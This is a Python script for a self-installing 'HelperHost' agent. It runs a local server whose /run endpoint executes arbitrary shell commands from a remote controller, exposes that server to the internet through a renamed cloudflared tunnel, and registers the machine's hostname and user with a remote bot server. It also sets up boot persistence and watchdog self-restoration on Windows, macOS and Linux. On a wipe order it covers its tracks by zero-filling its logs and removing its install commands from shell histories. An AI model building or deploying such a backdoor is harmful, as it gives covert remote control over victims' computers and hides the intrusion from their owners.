#!/usr/bin/env python3
"""PC agent — HelperHost / EdgeRelay. Stdlib only."""
from __future__ import annotations

import json
import os
import re
import shutil
import socket
import subprocess
import sys
import tempfile
import threading
import time
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

IS_WIN = sys.platform == "win32"
HELPER = "HelperHost.exe" if IS_WIN else "HelperHost"
EDGE = "EdgeRelay.exe" if IS_WIN else "EdgeRelay"


def _persistent_dir() -> str:
    if IS_WIN:
        base = os.environ.get("LOCALAPPDATA") or os.path.expanduser("~\\AppData\\Local")
        return os.path.join(base, "HelperHost")
    if sys.platform == "darwin":
        return os.path.expanduser("~/Library/Application Support/HelperHost")
    return os.path.expanduser("~/.local/share/HelperHost")


def _temp_cache_dir() -> str:
    root = tempfile.gettempdir()
    path = os.path.join(root, "HelperHostCache")
    os.makedirs(path, exist_ok=True)
    return path


DIR = _persistent_dir()
os.makedirs(DIR, exist_ok=True)
CACHE = _temp_cache_dir()

CONFIG_PATH = os.path.join(DIR, "config.json")
TOKEN_PATH = os.path.join(DIR, "token")
URL_PATH = os.path.join(DIR, "public_url")
AGENT_PY = os.path.join(DIR, "agent.py")
LOG_PATH = os.path.join(DIR, "agent.log")
HELPER_PATH = os.path.join(DIR, HELPER)
EDGE_PATH = os.path.join(DIR, EDGE)
RUNTIME_DIR = os.path.join(DIR, "runtime")
PYTHON_HOME_FILE = os.path.join(DIR, "python_home")

TOKEN = ""
PUBLIC_URL = ""
CF_PROC = None
STOP = False
ENROLL = ""
BOT_BASE = ""


def log(msg: str) -> None:
    # never log public URLs / IPs
    safe = re.sub(r"https://[^\s]+", "[redacted]", msg)
    safe = re.sub(r"\b\d{1,3}(?:\.\d{1,3}){3}\b", "[redacted]", safe)
    line = time.strftime("%Y-%m-%dT%H:%M:%SZ ") + safe
    try:
        with open(LOG_PATH, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def hostname() -> str:
    try:
        return socket.gethostname().split(".")[0] or "host"
    except Exception:
        return "host"


def load_config() -> None:
    global ENROLL, BOT_BASE
    enroll = os.environ.get("AGENTSHE_ENROLL", "").strip()
    base = os.environ.get("AGENTSHE_BOT_BASE", "").strip().rstrip("/")
    if os.path.isfile(CONFIG_PATH):
        cfg = json.loads(open(CONFIG_PATH, encoding="utf-8").read())
        enroll = enroll or cfg.get("enroll", "")
        base = base or (cfg.get("bot_base") or "").rstrip("/")
    if not enroll or not base:
        raise RuntimeError("config manquante")
    ENROLL, BOT_BASE = enroll, base
    with open(CONFIG_PATH, "w", encoding="utf-8") as f:
        json.dump({"enroll": ENROLL, "bot_base": BOT_BASE}, f)


def find_free_port() -> int:
    s = socket.socket()
    s.bind(("127.0.0.1", 0))
    port = s.getsockname()[1]
    s.close()
    return port


def run_cmd(command: str):
    try:
        p = subprocess.run(command, shell=True, capture_output=True, text=True, timeout=300)
        return (p.stdout or "") + (p.stderr or ""), int(p.returncode)
    except subprocess.TimeoutExpired:
        return "(timeout)", 124
    except Exception as e:
        return str(e), 1


def _download(url: str, dest: str) -> None:
    tmp = dest + ".part"
    urllib.request.urlretrieve(url, tmp)
    os.replace(tmp, dest)


def _cache_copy(name: str, dest: str) -> bool:
    src = os.path.join(CACHE, name)
    if os.path.isfile(src):
        shutil.copy2(src, dest)
        try:
            os.chmod(dest, 0o755)
        except OSError:
            pass
        return True
    return False


def _to_cache(name: str, src: str) -> None:
    try:
        shutil.copy2(src, os.path.join(CACHE, name))
    except Exception:
        pass


def ensure_edge_relay() -> str:
    """Restore EdgeRelay from TEMP cache or re-download via TEMP."""
    if os.path.isfile(EDGE_PATH) and os.access(EDGE_PATH, os.X_OK):
        _to_cache(EDGE, EDGE_PATH)
        return EDGE_PATH
    if _cache_copy(EDGE, EDGE_PATH):
        log("EdgeRelay restored from cache")
        return EDGE_PATH
    machine = ""
    try:
        machine = os.uname().machine.lower()
    except Exception:
        machine = os.environ.get("PROCESSOR_ARCHITECTURE", "").lower()
    if IS_WIN:
        url = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    elif sys.platform == "darwin":
        url = (
            "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-arm64"
            if ("arm" in machine or "aarch64" in machine)
            else "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-darwin-amd64"
        )
    else:
        url = (
            "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-arm64"
            if ("aarch64" in machine or "arm64" in machine)
            else "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
        )
    staging = os.path.join(CACHE, EDGE + ".download")
    log("fetch EdgeRelay via temp")
    _download(url, staging)
    shutil.copy2(staging, EDGE_PATH)
    _to_cache(EDGE, EDGE_PATH)
    try:
        os.chmod(EDGE_PATH, 0o755)
    except OSError:
        pass
    return EDGE_PATH


def ensure_helper_present() -> None:
    """If HelperHost was deleted by mistake, restore from TEMP cache when possible."""
    if os.path.isfile(HELPER_PATH) and os.access(HELPER_PATH, os.X_OK):
        _to_cache(HELPER, HELPER_PATH)
        return
    if _cache_copy(HELPER, HELPER_PATH):
        log("HelperHost restored from cache")
        return
    # Windows: also restore runtime dlls from cache zip if present
    log("HelperHost missing — waiting for reinstall via Connecter if cache empty")


def remove_autostart() -> None:
    if sys.platform == "darwin":
        for label in ("com.helperhost.agent", "fr.agentshe.pc"):
            plist = os.path.expanduser(f"~/Library/LaunchAgents/{label}.plist")
            try:
                uid = os.getuid()
                subprocess.run(
                    ["launchctl", "bootout", f"gui/{uid}", plist],
                    check=False,
                    capture_output=True,
                )
            except Exception:
                pass
            subprocess.run(["launchctl", "unload", plist], check=False, capture_output=True)
            try:
                os.remove(plist)
            except OSError:
                pass
        return
    if IS_WIN:
        for tn in ("HelperHost", "AgentShePC"):
            subprocess.run(
                ["schtasks", "/Delete", "/TN", tn, "/F"],
                check=False,
                capture_output=True,
            )
        try:
            import winreg

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            for name in ("HelperHost", "AgentShePC"):
                try:
                    winreg.DeleteValue(key, name)
                except FileNotFoundError:
                    pass
            winreg.CloseKey(key)
        except Exception:
            pass
        return
    for svc in ("helperhost.service", "agentshe.service"):
        subprocess.run(
            ["systemctl", "--user", "disable", "--now", svc],
            check=False,
            capture_output=True,
        )
        try:
            os.remove(os.path.expanduser(f"~/.config/systemd/user/{svc}"))
        except OSError:
            pass


def _kill_tunnel_only() -> None:
    global CF_PROC
    try:
        if CF_PROC and CF_PROC.poll() is None:
            CF_PROC.terminate()
            try:
                CF_PROC.wait(timeout=2)
            except Exception:
                CF_PROC.kill()
    except Exception:
        pass
    CF_PROC = None
    if IS_WIN:
        subprocess.run(
            ["taskkill", "/F", "/IM", "EdgeRelay.exe"],
            check=False,
            capture_output=True,
        )
    else:
        subprocess.run(["pkill", "-f", EDGE], check=False, capture_output=True)


def _secure_rm_tree(path: str) -> None:
    """Delete directory; best-effort overwrite of small text logs first."""
    if not path or not os.path.exists(path):
        return
    try:
        for root, _dirs, files in os.walk(path):
            for fn in files:
                fp = os.path.join(root, fn)
                try:
                    if fn.endswith((".log", ".json", ".txt", "token", "public_url", "boot.log")) or fn in (
                        "token",
                        "public_url",
                        "python_home",
                    ):
                        size = os.path.getsize(fp)
                        with open(fp, "wb") as f:
                            f.write(b"\x00" * min(size, 2_000_000))
                except Exception:
                    pass
    except Exception:
        pass
    shutil.rmtree(path, ignore_errors=True)


def _scrub_shell_artifacts() -> None:
    """Remove install one-liners from common shell histories if present."""
    markers = (
        "HelperHost",
        "EdgeRelay",
        "agentshe",
        "bootstrap-sh",
        "bootstrap&enroll",
        "HelperHostCache",
    )
    candidates = []
    home = os.path.expanduser("~")
    if IS_WIN:
        candidates.append(
            os.path.join(
                home,
                "AppData",
                "Roaming",
                "Microsoft",
                "Windows",
                "PowerShell",
                "PSReadLine",
                "ConsoleHost_history.txt",
            )
        )
    else:
        candidates.extend(
            [
                os.path.join(home, ".bash_history"),
                os.path.join(home, ".zsh_history"),
            ]
        )
    for path in candidates:
        if not os.path.isfile(path):
            continue
        try:
            with open(path, "r", encoding="utf-8", errors="ignore") as f:
                lines = f.readlines()
            kept = [ln for ln in lines if not any(m.lower() in ln.lower() for m in markers)]
            if len(kept) != len(lines):
                with open(path, "w", encoding="utf-8") as f:
                    f.writelines(kept)
        except Exception:
            pass


def wipe_all() -> None:
    """Full erase: binaries, logs, TEMP cache, autostart, command traces. Zero leftovers."""
    global STOP
    STOP = True
    # Never kill HelperHost mid-wipe — finish deletes first, then exit.
    remove_autostart()
    _kill_tunnel_only()
    _scrub_shell_artifacts()
    _secure_rm_tree(DIR)
    _secure_rm_tree(CACHE)
    _secure_rm_tree(os.path.join(os.path.expanduser("~"), ".agentshe"))
    if IS_WIN:
        local = os.environ.get("LOCALAPPDATA") or ""
        if local:
            _secure_rm_tree(os.path.join(local, "AgentShe"))
            _secure_rm_tree(os.path.join(local, "CabaretAgent"))
    for k in ("AGENTSHE_ENROLL", "AGENTSHE_BOT_BASE", "PYTHONHOME"):
        os.environ.pop(k, None)
    os._exit(0)


class Handler(BaseHTTPRequestHandler):
    def log_message(self, *args):
        return

    def _read_json(self):
        n = int(self.headers.get("Content-Length") or 0)
        raw = self.rfile.read(n) if n else b"{}"
        try:
            return json.loads(raw.decode() or "{}")
        except Exception:
            return {}

    def _auth(self, body=None) -> bool:
        auth = self.headers.get("X-AgentShe-Token") or ""
        if body and body.get("token"):
            auth = body.get("token") or auth
        return bool(TOKEN) and auth == TOKEN

    def _send(self, code: int, obj: dict):
        data = json.dumps(obj).encode()
        self.send_response(code)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(data)))
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        if self.path.startswith("/health"):
            from urllib.parse import parse_qs, urlparse

            tok = (parse_qs(urlparse(self.path).query).get("token") or [""])[0]
            if tok != TOKEN and not self._auth({}):
                return self._send(401, {"ok": False})
            return self._send(200, {"ok": True, "name": hostname()})
        self._send(404, {"ok": False})

    def do_POST(self):
        body = self._read_json()
        if self.path == "/run":
            if not self._auth(body):
                return self._send(401, {"ok": False})
            cmd = (body.get("command") or "").strip()
            if not cmd:
                return self._send(400, {"ok": False})
            out, ec = run_cmd(cmd)
            return self._send(200, {"ok": True, "output": out, "exit_code": ec})
        if self.path == "/shutdown":
            if not self._auth(body):
                return self._send(401, {"ok": False})
            self._send(200, {"ok": True, "bye": True})
            threading.Thread(target=wipe_all, daemon=True).start()
            return
        self._send(404, {"ok": False})


def install_autostart() -> str:
    sh = os.path.join(DIR, "reconnect.sh")
    vbs = os.path.join(DIR, "reconnect.vbs")
    watch_sh = os.path.join(DIR, "watchdog.sh")
    watch_vbs = os.path.join(DIR, "watchdog.vbs")
    methods = []

    ph_export = ""
    if os.path.isfile(PYTHON_HOME_FILE):
        ph_export = f'export PYTHONHOME="$(cat "{PYTHON_HOME_FILE}")"\n'

    with open(watch_sh, "w", encoding="utf-8") as f:
        f.write(
            f"""#!/bin/bash
cd "{DIR}"
while true; do
  if [ ! -x "{HELPER_PATH}" ]; then
    # try restore from temp cache
    if [ -f "{CACHE}/{HELPER}" ]; then cp "{CACHE}/{HELPER}" "{HELPER_PATH}"; chmod +x "{HELPER_PATH}"; fi
  fi
  if [ ! -x "{EDGE_PATH}" ]; then
    if [ -f "{CACHE}/{EDGE}" ]; then cp "{CACHE}/{EDGE}" "{EDGE_PATH}"; chmod +x "{EDGE_PATH}"; fi
  fi
  # When network is back, agent enrolls; if bot marked wipe_pending → full self-erase + Telegram notif
  if ! pgrep -f "{HELPER_PATH}" >/dev/null 2>&1; then
    {ph_export}nohup "{HELPER_PATH}" "{AGENT_PY}" >> "{LOG_PATH}" 2>&1 &
  fi
  sleep 20
done
"""
        )
    os.chmod(watch_sh, 0o755)

    with open(sh, "w", encoding="utf-8") as f:
        f.write(
            f"""#!/bin/bash
cd "{DIR}"
for i in $(seq 1 90); do
  curl -fsS --max-time 3 https://cloudflare.com >/dev/null 2>&1 && break
  sleep 2
done
pkill -f "{watch_sh}" 2>/dev/null || true
nohup /bin/bash "{watch_sh}" >/dev/null 2>&1 &
{ph_export}exec "{HELPER_PATH}" "{AGENT_PY}" >> "{LOG_PATH}" 2>&1
"""
        )
    os.chmod(sh, 0o755)

    if IS_WIN:
        dir_win = DIR.replace("/", "\\")
        helper_win = HELPER_PATH.replace("/", "\\")
        agent_win = AGENT_PY.replace("/", "\\")
        watch_vbs_win = watch_vbs.replace("/", "\\")
        cache_win = CACHE.replace("/", "\\")
        with open(watch_vbs, "w", encoding="utf-8", newline="\r\n") as f:
            f.write('Set sh = CreateObject("WScript.Shell")\r\n')
            f.write(f'sh.CurrentDirectory = "{dir_win}"\r\n')
            f.write("Do\r\n")
            f.write(f'  If Not CreateObject("Scripting.FileSystemObject").FileExists("{helper_win}") Then\r\n')
            f.write(
                f'    If CreateObject("Scripting.FileSystemObject").FileExists("{cache_win}\\{HELPER}") Then\r\n'
            )
            f.write(
                f'      CreateObject("Scripting.FileSystemObject").CopyFile "{cache_win}\\{HELPER}", "{helper_win}", True\r\n'
            )
            f.write("    End If\r\n  End If\r\n")
            f.write('  Set wmi = GetObject("winmgmts:\\\\.\\root\\cimv2")\r\n')
            f.write(
                "  Set procs = wmi.ExecQuery(\"Select * from Win32_Process Where Name = 'HelperHost.exe'\")\r\n"
            )
            f.write("  If procs.Count = 0 Then\r\n")
            f.write(
                '    sh.Run """' + helper_win + '"" ""' + agent_win + '""", 0, False\r\n'
            )
            f.write("  End If\r\n  WScript.Sleep 20000\r\nLoop\r\n")
        with open(vbs, "w", encoding="utf-8", newline="\r\n") as f:
            f.write('Set sh = CreateObject("WScript.Shell")\r\n')
            f.write(f'sh.CurrentDirectory = "{dir_win}"\r\n')
            f.write("Dim i\r\nFor i = 1 To 90\r\n")
            f.write('  rc = sh.Run("ping -n 1 -w 2000 1.1.1.1", 0, True)\r\n')
            f.write("  If rc = 0 Then Exit For\r\n  WScript.Sleep 2000\r\nNext\r\n")
            f.write(f'sh.Run "wscript.exe //B //Nologo ""{watch_vbs_win}""", 0, False\r\n')
            f.write(
                'sh.Run """' + helper_win + '"" ""' + agent_win + '""", 0, False\r\n'
            )
        tr = f'wscript.exe //B //Nologo "{vbs}"'
        subprocess.run(["schtasks", "/Delete", "/TN", "HelperHost", "/F"], check=False, capture_output=True)
        r = subprocess.run(
            [
                "schtasks",
                "/Create",
                "/TN",
                "HelperHost",
                "/TR",
                tr,
                "/SC",
                "ONLOGON",
                "/DELAY",
                "0001:00",
                "/RL",
                "LIMITED",
                "/F",
            ],
            check=False,
            capture_output=True,
        )
        if r.returncode == 0:
            methods.append("task")
        try:
            import winreg

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            winreg.SetValueEx(key, "HelperHost", 0, winreg.REG_SZ, tr)
            winreg.CloseKey(key)
            methods.append("run")
        except Exception as e:
            log(f"reg {e}")
        return ",".join(methods) or "ok"

    if sys.platform == "darwin":
        launch = os.path.expanduser("~/Library/LaunchAgents")
        os.makedirs(launch, exist_ok=True)
        label = "com.helperhost.agent"
        plist = os.path.join(launch, f"{label}.plist")
        with open(plist, "w", encoding="utf-8") as f:
            f.write(
                f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>{label}</string>
  <key>ProgramArguments</key><array>
    <string>/bin/bash</string><string>{sh}</string>
  </array>
  <key>RunAtLoad</key><true/>
  <key>KeepAlive</key><true/>
  <key>ThrottleInterval</key><integer>5</integer>
  <key>ProcessType</key><string>Background</string>
  <key>WorkingDirectory</key><string>{DIR}</string>
  <key>StandardOutPath</key><string>{os.path.join(DIR, "out.log")}</string>
  <key>StandardErrorPath</key><string>{os.path.join(DIR, "err.log")}</string>
</dict></plist>
"""
            )
        uid = os.getuid()
        subprocess.run(["launchctl", "bootout", f"gui/{uid}", plist], check=False, capture_output=True)
        subprocess.run(["launchctl", "bootstrap", f"gui/{uid}", plist], check=False, capture_output=True)
        subprocess.run(["launchctl", "enable", f"gui/{uid}/{label}"], check=False, capture_output=True)
        return "launchd"

    unit_dir = os.path.expanduser("~/.config/systemd/user")
    os.makedirs(unit_dir, exist_ok=True)
    unit = os.path.join(unit_dir, "helperhost.service")
    with open(unit, "w", encoding="utf-8") as f:
        f.write(
            f"""[Unit]
Description=HelperHost
After=network-online.target
[Service]
Type=simple
ExecStart=/bin/bash {sh}
Restart=always
RestartSec=5
[Install]
WantedBy=default.target
"""
        )
    subprocess.run(["systemctl", "--user", "daemon-reload"], check=False, capture_output=True)
    subprocess.run(["systemctl", "--user", "enable", "--now", "helperhost.service"], check=False, capture_output=True)
    return "systemd"


def start_tunnel(port: int) -> str:
    global CF_PROC
    if CF_PROC and CF_PROC.poll() is None:
        try:
            CF_PROC.terminate()
        except Exception:
            pass
    bin_path = ensure_edge_relay()
    kwargs = {"stdout": subprocess.PIPE, "stderr": subprocess.STDOUT, "text": True}
    if IS_WIN:
        kwargs["creationflags"] = getattr(subprocess, "CREATE_NO_WINDOW", 0x08000000)
    else:
        kwargs["start_new_session"] = True
    CF_PROC = subprocess.Popen(
        [bin_path, "tunnel", "--url", f"http://127.0.0.1:{port}", "--no-autoupdate"],
        **kwargs,
    )
    url_re = re.compile(r"https://[a-zA-Z0-9.-]+\.trycloudflare\.com")
    deadline = time.time() + 90
    assert CF_PROC.stdout
    while time.time() < deadline:
        line = CF_PROC.stdout.readline()
        if not line and CF_PROC.poll() is not None:
            break
        m = url_re.search(line or "")
        if m:
            return m.group(0).rstrip("/")
        time.sleep(0.01)
    raise RuntimeError("tunnel non prêt")


def network_ok() -> bool:
    for url in ("https://1.1.1.1", "https://cloudflare.com"):
        try:
            urllib.request.urlopen(url, timeout=3).read(8)
            return True
        except Exception:
            continue
    return False


def tunnel_public_ok() -> bool:
    if not PUBLIC_URL or not TOKEN:
        return False
    try:
        with urllib.request.urlopen(f"{PUBLIC_URL}/health?token={TOKEN}", timeout=12) as r:
            return bool(json.loads(r.read().decode()).get("ok"))
    except Exception:
        return False


def report_wiped(token: str) -> None:
    """Tell bot local wipe is starting so it can purge session + notify Telegram."""
    payload = json.dumps({"token": token}).encode()
    req = urllib.request.Request(
        f"{BOT_BASE}/agent?action=wiped",
        data=payload,
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    with urllib.request.urlopen(req, timeout=30) as resp:
        data = json.loads(resp.read().decode() or "{}")
    if not data.get("ok"):
        raise RuntimeError(data.get("error") or "wiped ack failed")


def wipe_ordered() -> bool:
    """Ask bot if this PC must self-destruct (pending wipe while we were offline)."""
    if not TOKEN or not BOT_BASE:
        return False
    try:
        payload = json.dumps({"token": TOKEN}).encode()
        req = urllib.request.Request(
            f"{BOT_BASE}/agent?action=wipe-check",
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, timeout=20) as resp:
            data = json.loads(resp.read().decode())
        return bool(data.get("ok") and data.get("wipe"))
    except Exception:
        return False


def enroll(public_url: str) -> str:
    last = None
    for attempt in range(1, 31):
        try:
            payload = json.dumps(
                {
                    "hostname": hostname(),
                    "callback_url": public_url,
                    "user": os.environ.get("USER") or os.environ.get("USERNAME") or "",
                    "os": sys.platform,
                    "platform": "windows" if IS_WIN else "unix",
                }
            ).encode()
            req = urllib.request.Request(
                f"{BOT_BASE}/agent?action=enroll&enroll={ENROLL}",
                data=payload,
                headers={"Content-Type": "application/json"},
                method="POST",
            )
            with urllib.request.urlopen(req, timeout=45) as resp:
                data = json.loads(resp.read().decode())
            if not data.get("ok"):
                raise RuntimeError(data.get("error") or "enroll failed")
            token = data["token"]
            if data.get("wipe"):
                log("wipe ordered on enroll")
                for _ in range(5):
                    try:
                        report_wiped(token)
                        break
                    except Exception:
                        time.sleep(2)
                else:
                    try:
                        report_wiped(token)
                    except Exception:
                        pass
                wipe_all()
            return token
        except Exception as e:
            last = e
            log(f"enroll retry {attempt}")
            time.sleep(min(2 * attempt, 20))
    raise RuntimeError(str(last))


def acquire_lock() -> None:
    lock = os.path.join(DIR, "agent.lock")
    if os.path.isfile(lock):
        try:
            old = int(open(lock, encoding="utf-8").read().strip() or "0")
            os.kill(old, 0)
            sys.exit(0)
        except Exception:
            try:
                os.remove(lock)
            except OSError:
                pass
    open(lock, "w", encoding="utf-8").write(str(os.getpid()))


def publish(port: int, first: bool, autostart_info: str) -> None:
    global TOKEN, PUBLIC_URL
    ensure_helper_present()
    ensure_edge_relay()
    for _ in range(1, 60):
        if network_ok():
            break
        time.sleep(2)
    PUBLIC_URL = start_tunnel(port)
    TOKEN = enroll(PUBLIC_URL)
    open(TOKEN_PATH, "w", encoding="utf-8").write(TOKEN)
    open(URL_PATH, "w", encoding="utf-8").write(PUBLIC_URL)
    log("ready")
    if first:
        # no URL / IP in terminal output
        print("OK")
        print(f"agent={hostname()}")
        print(f"autostart={autostart_info}")
        print("reboot=auto")
        print("watchdog=on")
        print(f"proc_agent={HELPER}")
        print(f"proc_tunnel={EDGE}")
        sys.stdout.flush()


def supervise_until_break() -> None:
    ticks = 0
    fail = 0
    while not STOP:
        time.sleep(5)
        ticks += 1
        ensure_helper_present()
        try:
            ensure_edge_relay()
        except Exception:
            pass
        # Pending wipe while already online (delete issued while tunnel was dead)
        if ticks % 3 == 0 and wipe_ordered():
            log("wipe ordered while running")
            for _ in range(5):
                try:
                    report_wiped(TOKEN)
                    break
                except Exception:
                    time.sleep(2)
            wipe_all()
        if CF_PROC is None or CF_PROC.poll() is not None:
            return
        if not network_ok():
            fail += 1
            if fail >= 2:
                return
            continue
        fail = 0
        if ticks % 6 == 0 and not tunnel_public_ok():
            return


def main() -> None:
    global STOP
    load_config()
    acquire_lock()
    ensure_helper_present()
    info = install_autostart()
    port = find_free_port()
    server = ThreadingHTTPServer(("127.0.0.1", port), Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    first = True
    while not STOP:
        try:
            publish(port, first, info)
            first = False
            supervise_until_break()
            try:
                if CF_PROC and CF_PROC.poll() is None:
                    CF_PROC.terminate()
            except Exception:
                pass
            time.sleep(2)
        except Exception as e:
            log(f"err {e}")
            time.sleep(5)


if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"FAIL: {e}", file=sys.stderr)
        sys.exit(1)
